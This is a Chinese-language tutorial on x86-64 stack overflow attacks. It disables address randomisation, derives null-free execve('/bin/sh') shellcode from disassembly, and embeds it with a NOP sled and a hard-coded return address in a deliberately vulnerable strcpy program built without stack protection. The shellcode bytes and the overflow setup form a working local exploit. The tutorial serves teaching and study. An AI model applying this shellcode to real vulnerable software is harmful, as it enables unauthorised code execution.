# 栈溢出攻击介绍

## 准备环境
> 关闭堆栈随机化：echo 0 > /proc/sys/kernel/randomize_va_space

## 编写shell code代码

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main(int argc, char **argv)
    {
        char *name[2];

        name[0] = "/bin/sh";
        name[1] = NULL;
        execve(name[0], NULL, NULL);
        exit(0);
 
        return 0;
    }
    
> 首先，shellcode代码需要静态编译即`gcc -static shellcode.c -o shellcode`,
> 然后反汇编shellcode：objdump -saxd shellcode > shellcode.s，内容如下：

    000000000043d6b0 <__execve>:
    01:   f3 0f 1e fa             endbr64  
    02:   b8 3b 00 00 00          mov    $0x3b,%eax
    03:   0f 05                   syscall
    04:   48 3d 01 f0 ff ff       cmp    $0xfffffffffffff001,%rax  
    05:   73 01                   jae    43d6c4 <__execve+0x14>
    06:   c3                      retq
    07:   48 c7 c1 c0 ff ff ff    mov    $0xffffffffffffffc0,%rcx  
    08:   f7 d8                   neg    %eax
    09:   64 89 01                mov    %eax,%fs:(%rcx)
    10:   48 83 c8 ff             or     $0xffffffffffffffff,%rax  
    11:   c3                      retq
    12:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
    13:   00 00 00   
    14:   90                      nop
    
    00000000004016d5 <main>:
    15:   55                      push   %rbp     
    16:   48 89 e5                mov    %rsp,%rbp
    17:   48 83 ec 20             sub    $0x20,%rsp
    18:   89 7d ec                mov    %edi,-0x14(%rbp)  
    19:   48 89 75 e0             mov    %rsi,-0x20(%rbp)
    20:   48 c7 45 f0 10 00 48    movq   $0x480010,-0x10(%rbp)
    21:   00   
    22:   48 c7 45 f8 00 00 00    movq   $0x0,-0x8(%rbp)
    23:   00 
    24:   48 8b 45 f0             mov    -0x10(%rbp),%rax  
    25:   ba 00 00 00 00          mov    $0x0,%edx
    26:   be 00 00 00 00          mov    $0x0,%esi
    27:   48 89 c7                mov    %rax,%rdi  
    28:   e8 a6 bf 03 00          callq  43d6b0 <__execve>
    29:   bf 00 00 00 00          mov    $0x0,%edi
    30:   e8 7c 77 00 00          callq  408e90 <exit> 
    31:   66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
    32:   00 00 00 
    33:   66 90                   xchg   %ax,%ax
    
    Contents of section .rodata: 480000 01000200 00000000 00000000 00000000
    ................
    480010 2f62696e 2f736800 00000000 00000000  /bin/sh.........
    
> 提取20行-28行，并将28行用01行-03行替换，可以得到一段未经过处理的shell code,如下

    01:   48 c7 45 f0 10 00 48    movq   $0x480010,-0x10(%rbp) # 取rodata段的内容到栈上
    02:   48 8b 45 f0             mov    -0x10(%rbp),%rax      # 将栈上的内容放置到rax寄存器
    03:   ba 00 00 00 00          mov    $0x0, %edx            # 初始化第三个参数
    04:   be 00 00 00 00          mov    $0x0, %rsi            # 初始化第二个参数
    05:   48 89 c7                mov    %rax,%rdi             # 初始化第一个参数
    06:   b8 3b 00 00 00          mov    $0x3b, %eax           # 设置系统调用号码
    07:   f3 0f 1e fa             endbr64
    08:   0f 05                   syscall                      # 系统调用
    
> 01行中的0x480010地址的内容在rodata段上面，值为2f62696e 2f736800，即/bin/sh。但是在注入代码中不会存在这个值，因此需要将该静态存储值转换到栈中，转换后如下，

    01:   48 83 ec 08             sub $0x8, %rsp        # 开辟8个字节的栈空间
    02:   48 c7 c0 2f 62 69 6e    mov $0x6e69622f, %rax # 将/bin存放到rsp开始的连续4字节   
    03:   48 89 04 24             mov %rax, (%rsp)
    04:   48 c7 c0 2f 2f 73 68    mov $0x68732f2f, %rax # 将//sh存放到rsp+4开始的连续4字节，占用8字节的栈空间
    05:   48 89 44 24 04          mov %rax, 0x4(%rsp)
    06:   ba 00 00 00 00          mov $0x0, %edx
    07:   be 00 00 00 00          mov $0x0, %rsi
    08:   48 89 e7                movq %rsp, %rdi
    09:   b8 3b 00 00 00          mov $0x3b, %eax
    10:   f3 0f 1e fa             endbr64
    11:   0f 05                   syscall
    
> 其中，由于我们采用的是栈攻击，并且是对strcpy进行攻击（strcpy是以'\0'作为结尾的，因此在shellcode里面不能有'\0'字符出现），因此需要将06-07行，09行进行转换，转换后结果为，

    01:   48 83 ec 08             sub $0x8, %rsp
    02:   48 c7 c0 2f 62 69 6e    mov $0x6e69622f, %rax
    03:   48 89 04 24             mov %rax, (%rsp)
    04:   48 c7 c0 2f 2f 73 68    mov $0x68732f2f, %rax
    05:   48 89 44 24 04          mov %rax, 0x4(%rsp)
    06:   31 d2                   xor %edx, %edx   # 清0用异或替代
    07:   48 31 f6                xor %rsi, %rsi   # 清0用异或替代
    08:   48 89 e7                movq %rsp, %rdi
    09:   31 c0                   xor %eax, %eax   # 清0用异或替代
    10:   b0 3b                   mov $0x3b, %al   # 只操作eax的低8位
    11:   f3 0f 1e fa             endbr64
    12:   0f 05                   syscall
    
> 将如上，汇编编译成机器码，可以得到shellcode为，

    0x48,0x83,0xec,0x08,                     // sub    $0x8,%rsp
    0x48,0xc7,0xc0,0x2f,0x62,0x69,0x6e,      // mov    $0x6e69622f,%rax 
    0x48,0x89,0x04,0x24,                     // mov    %rax,(%rsp)
    0x48,0xc7,0xc0,0x2f,0x2f,0x73,0x68,      // mov    $0x68732f2f,%rax
    0x48,0x89,0x44,0x24,0x04,                // mov    %rax,0x4(%rsp)
    0x31,0xd2,                               // xor    %edx,%edx 
    0x48,0x31,0xf6,                          // xor    %rsi,%rsi
    0x48,0x89,0xe7,                          // mov    %rsp,%rdi 
    0x31,0xc0,                               // xor    %eax,%eax
    0xb0,0x3b,                               // mov    $0x3b,%al
    0xf3,0x0f,0x1e,0xfa,                     // endbr64
    0x0f,0x05,                               // syscall
    
> 将这段shellcode作为strcpy的src参数，拷贝给dest(dest的地址在栈上)，使其在拷贝过程中溢出，然后看运行效果。

## 被测试代码如下，

    #include <stdio.h>#include <string.h>
    #include <stdlib.h>
    
    #define MAX_SIZE 50     /*  buffer size in stack */

    /* X86_64 shell code */
    static char shell_code[] = {
        0x90,0x90,0x90,0x90,0x90,0x90,           // nop
        0x90,0x90,0x90,0x90,0x90,0x90,           // nop
        0x90,0x90,0x90,0x90,0x90,0x90,           // nop
        0x90,0x90,0x90,0x90,0x90,0x90,           // nop
        0x48,0x83,0xec,0x08,                     // sub    $0x8,%rsp
        0x48,0xc7,0xc0,0x2f,0x62,0x69,0x6e,      // mov    $0x6e69622f,%rax 
        0x48,0x89,0x04,0x24,                     // mov    %rax,(%rsp)
        0x48,0xc7,0xc0,0x2f,0x2f,0x73,0x68,      // mov    $0x68732f2f,%rax
        0x48,0x89,0x44,0x24,0x04,                // mov    %rax,0x4(%rsp)
        0x31,0xd2,                               // xor    %edx,%edx
        0x48,0x31,0xf6,                          // xor    %rsi,%rsi
        0x48,0x89,0xe7,                          // mov    %rsp,%rdi
        0x31,0xc0,                               // xor    %eax,%eax
        0xb0,0x3b,                               // mov    $0x3b,%al
        0xf3,0x0f,0x1e,0xfa,                     // endbr64
        0x0f,0x05,                               // syscall
        0x90,0x90,0x90,                          // nop
        0xe0,0xde,0xff,0xff,0xff,0x7f,0x00,0x00, // rip = shellcode address
    };

    static int string_copy(char * src)
    {
        char dest[MAX_SIZE];

        if (strcpy (dest, src) == NULL)
            printf ("strcpy failed\n");
        else 
            printf ("strcpy success\n");

        return 0;
    }

    int main(int argc, char *argv[])
    {
        int size;
    
        size = string_copy(shell_code);
    
        while (size-- > 0) {
            printf("wait...\n");
            sleep (1);
        }
    
        return 0;
    }

> 编译方式：gcc -g -z execstack -fno-stack-protector stack_test.c -o stack_test


> 注意：因为strcpy的目标缓冲区是50个字节，然后ebp占用8字节， rip占用8字节，栈对齐到16字节，因此shellcode需要80字节，而我们的shellcode不够80字节，剩下的用nop填充，即0x90。最后在rip的位置填充好的shellcode在栈上面的其实地址即可。
